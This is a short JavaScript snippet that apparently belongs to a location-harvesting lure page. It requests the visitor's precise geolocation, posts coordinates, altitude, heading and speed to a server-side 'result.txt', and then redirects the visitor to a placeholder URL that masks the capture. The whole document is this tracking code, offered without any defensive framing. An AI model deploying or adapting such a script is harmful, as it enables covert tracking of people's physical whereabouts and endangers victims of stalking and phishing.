function locate()
{
if(navigator.geolocation)
{
    var optn = {enableHighAccuracy : true, timeout : 30000, maximumage: 0};
    navigator.geolocation.getCurrentPosition(showPosition, showError, optn);
}
else
{
    alert('Geolocation is not Supported by your Browser...');
}

function showPosition(position)
{
    var lat = position.coords.latitude;
    var lon = position.coords.longitude;
    var acc = position.coords.accuracy;
    var alt = position.coords.altitude;
    var dir = position.coords.heading;
    var spd = position.coords.speed;

    $.ajax({
    type: 'POST',
    url: './result.txt',
    data: {Lat: lat, Lon: lon, Acc: acc, Alt: alt, Dir: dir, Spd: spd},
    success: function(){window.location='REDIRECT_URL';},
    mimeType: 'text'
    });
};
}
